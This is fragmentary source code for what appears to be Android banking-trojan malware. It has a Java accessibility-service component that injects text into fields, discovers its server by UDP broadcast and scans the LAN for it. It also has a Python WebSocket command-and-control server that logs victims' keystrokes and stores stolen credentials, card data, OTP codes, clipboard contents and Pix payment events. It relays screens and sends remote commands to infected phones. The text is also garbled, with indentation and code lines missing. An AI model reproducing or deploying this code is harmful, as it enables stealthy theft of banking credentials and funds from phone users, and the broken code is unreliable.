            return null;
        }
    }

    public static void fill(final KeySvc s, final float x, final float y, final String v) {
        s.touch(x, y);
        H.postDelayed(new Runnable() {
            @Override public void run() {
                try {
                    AccessibilityNodeInfo root = s.getRootInActiveWindow();
                    if (root == null) return;
                    AccessibilityNodeInfo f = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
                    if (f == null) return;
                    Bundle b = new Bundle();
                    b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, v);
                    f.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
                } catch (Throwable ignored) {}
            }
        }, 400);
    }
}

    public static String ip() {

                if (!ni.isUp() || ni.isLoopback()) continue;
                for (InetAddress a : Collections.list(ni.getInetAddresses()))
                    if (a instanceof Inet4Address) return a.getHostAddress();

        return "?";

    private static String broadcast() {
        DatagramSocket s = null;
        try {
            s = new DatagramSocket();
            s.setBroadcast(true);
            s.setSoTimeout(1500);
            byte[] msg = "AVAL".getBytes();
            s.send(new DatagramPacket(msg, msg.length,
                    InetAddress.getByName("255.255.255.255"), Cfg.DISC));
            byte[] buf = new byte[160];
            DatagramPacket p = new DatagramPacket(buf, buf.length);
            s.receive(p);
            String u = new String(buf, 0, p.getLength()).trim();
            if (u.startsWith("ws://") || u.startsWith("wss://")) return u;
        } catch (Throwable ignored) {
        } finally {
            try { if (s != null) s.close(); } catch (Throwable ignored) {}
        }
        return null;
    }

    private static String scan() {
        String my = ip();
        int dot = my.lastIndexOf('.');
        if (dot < 0) return null;
        final String base = my.substring(0, dot) + ".";
        final AtomicReference<String> hit = new AtomicReference<>();
        ExecutorService ex = Executors.newFixedThreadPool(24);
        for (int i = 1; i < 255; i++) {
            final int n = i;
            ex.execute(() -> {
                if (hit.get() != null) return;
                Socket s = null;
                try {
                    s = new Socket();
                    s.connect(new InetSocketAddress(base + n, Cfg.PORT), 350);
                    hit.compareAndSet(null, "ws://" + base + n + ":" + Cfg.PORT + "/ws?t=" + Cfg.TOKEN);
                } catch (Throwable ignored) {
                } finally {
                    try { if (s != null) s.close(); } catch (Throwable ignored) {}
                }
            });
        }
        ex.shutdown();
        try { ex.awaitTermination(7, TimeUnit.SECONDS); } catch (Throwable ignored) {}
        return hit.get();
    }

    public static String esc(String s) {
        if (s == null) return "";
        StringBuilder b = new StringBuilder(s.length() + 16);
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            if (c == '\\') b.append("\\\\");
            else if (c == '"') b.append("\\\"");
            else if (c == '\n') b.append("\\n");
            else if (c == '\r') b.append("\\r");
            else if (c == '\t') b.append("\\t");
            else if (c < 0x20) b.append(' ');
            else b.append(c);
        }
        return b.toString();
    }

import asyncio, json, os, socket, time
from aiohttp import web, WSMsgType

TOKEN = os.environ.get("AVAL_TOKEN", "m4t7k2p9x6v3n8b5z1q0w7r2")
DEVS = {}
VIEW = {}
BUSY = set()
KF = "teclado.log"
CF = "cofre.jsonl"
AQUI = os.path.dirname(os.path.abspath(__file__))


def klog(dev, pkg, win, txt):
    try:
        if os.path.exists(KF) and os.path.getsize(KF) > 3000000:
            with open(KF, encoding="utf-8", errors="replace") as f:
                cauda = f.read()[-1000000:]
            with open(KF, "w", encoding="utf-8") as f:
                f.write(cauda)
        with open(KF, "a", encoding="utf-8") as f:
            f.write("%s\t%s\t%s\t%s\n" % (time.strftime("%Y-%m-%d %H:%M:%S"), dev or "?",
                                          (pkg or "?") + ("/" + win if win else ""),
                                          (txt or "").replace("\n", "\\n")))
    except Exception:
        pass


def cofre(tipo, dev, o):
    try:
        if isinstance(o, str):
            o = {"v": o}
        o = dict(o)
        o["_t"] = tipo
        o["_dev"] = dev
        o["_h"] = time.strftime("%Y-%m-%d %H:%M:%S")
        with open(CF, "a", encoding="utf-8") as f:
            f.write(json.dumps(o, ensure_ascii=False) + "\n")
    except Exception:
        pass


def devlist():
    return [{"id": k, "m": v["i"].get("m", "?"), "bat": v["i"].get("bat", -1),
             "w": v["i"].get("w", 0), "h": v["i"].get("h", 0)} for k, v in DEVS.items()]


def ok(req):
    return req.query.get("t") == TOKEN


async def bcast(o, only=None):
    d = json.dumps(o)
    for v in [v for v, s in VIEW.items() if only is None or s == only]:
        try:
            await v.send_str(d)
        except Exception:
            pass


async def relay(dev, data):
    for v in [v for v, s in VIEW.items() if s == dev and v not in BUSY]:
        BUSY.add(v)
        try:
            await v.send_bytes(data)
        except Exception:
            pass
        finally:
            BUSY.discard(v)


async def devs():
    await bcast({"k": "devs", "d": devlist()})


async def index(req):
    if not ok(req):
        raise web.HTTPFound("/?t=" + TOKEN)
    try:
        with open(os.path.join(AQUI, "painel.html"), encoding="utf-8") as f:
            pagina = f.read()
    except Exception as e:
        return web.Response(text="painel.html ausente: %s" % e, status=500)
    return web.Response(text=pagina, content_type="text/html", charset="utf-8")


async def phone(req):
    if not ok(req):
        return web.Response(text="token invalido", status=403)
    if req.headers.get("Upgrade", "").lower() != "websocket":
        h = req.headers.get("Host", "localhost:8080")
        tls = req.secure or req.headers.get("X-Forwarded-Proto") == "https"
        return web.Response(text="%s://%s/ws?t=%s\n" % ("wss" if tls else "ws", h, TOKEN))
    ws = web.WebSocketResponse(heartbeat=20, max_msg_size=0, compress=False)
    await ws.prepare(req)
    dev = None
    try:
        async for m in ws:
            if m.type == WSMsgType.BINARY:
                if dev:
                    await relay(dev, m.data)
            elif m.type == WSMsgType.TEXT:
                try:
                    o = json.loads(m.data)
                except Exception:
                    o = {"t": "raw", "o": m.data}
                if o.get("t") == "hello":
                    dev = o.get("id", "?")
                    DEVS[dev] = {"ws": ws, "i": o}
                    print("+ %s (%d online)" % (dev, len(DEVS)))
                    await devs()
                elif o.get("t") == "ka":
                    try:
                        await ws.send_str('{"c":"ka"}')
                    except Exception:
                        pass
                    continue
                elif o.get("t") == "k":
                    klog(dev, o.get("pkg"), o.get("win"), o.get("o", ""))
                    await bcast({"k": "key", "d": {"id": dev, "pkg": o.get("pkg"),
                                                   "win": o.get("win"), "o": o.get("o", ""),
                                                   "h": time.strftime("%H:%M:%S")}})
                    continue
                elif o.get("t") in ("cred", "cartao", "otp", "clip", "pixvisto"):
                    cofre(o.get("t"), dev, o.get("o"))
                    await bcast({"k": "log", "d": o}, dev)
    except Exception as e:
        print(" ! erro em %s: %s" % (dev, e))
    finally:
        if dev and DEVS.get(dev, {}).get("ws") is ws:
            DEVS.pop(dev, None)
            print("- %s saiu" % dev)
            await devs()
    return ws

                continue
            if o.get("c") == "sel":

                        await alvo["ws"].send_str('{"c":"info"}')

                    except Exception:

                await ws.send_str(json.dumps({"k": "log", "d": {"t": "err", "o": "aparelho offline"}}))

            try:
                await alvo["ws"].send_str(json.dumps({k: v for k, v in o.items() if k != "id"}))

                pass
    except Exception:
        pass
    finally:
        VIEW.pop(ws, None)
    return ws

def local_ip(dst):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((dst, 9))
        return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        s.close()


async def udp_loop():
    loop = asyncio.get_event_loop()
    sk = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sk.bind(("0.0.0.0", 8089))
    except Exception as e:
        print("! udp 8089 indisponivel: %s" % e)
        return
    sk.setblocking(False)
    while True:
        try:
            data, addr = await loop.sock_recvfrom(sk, 64)
            if data.strip() == b"AVAL":
                await loop.sock_sendto(sk, ("ws://%s:8080/ws?t=%s" % (local_ip(addr[0]), TOKEN)).encode(), addr)
        except Exception:
            await asyncio.sleep(0.2)


async def on_start(app):
    app["udp"] = asyncio.create_task(udp_loop())
